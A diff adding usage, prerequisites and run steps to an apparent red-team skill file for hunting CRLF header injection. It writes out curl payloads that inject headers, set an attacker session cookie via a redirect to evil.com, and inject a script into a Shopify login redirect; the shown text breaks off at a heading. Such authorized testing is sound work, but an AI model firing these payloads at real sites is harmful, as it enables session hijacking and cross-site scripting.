@@ -8,6 +8,35 @@ category: redteam
 tags: [misc, hunt, redteam]
 ---
 
+## When to Use
+
+- Hunting misc on any target.
+
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`, `dig`, `python3`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+# Test CRLF in header values
+curl --max-time 30 --connect-timeout 10 -v "https://target.com/path" \
+  -H $'X-Custom: value\r\nInjected-Header: evil'
+
+# URL-encoded variant
+curl --max-time 30 --connect-timeout 10 -v "https://target.com/redirect?url=https://evil.com%0d%0aSet-Cookie:%20session=attacker"
+
+# Test in pitchfork/Rack apps — inject via query param reflected in Location header
+curl --max-time 30 --connect-timeout 10 -v "https://shop.[SHOPIFY_STORE]/login?return_to=%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>"
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
+
 ## Crown Jewel Targets
 
 **Why this vuln class pays:**
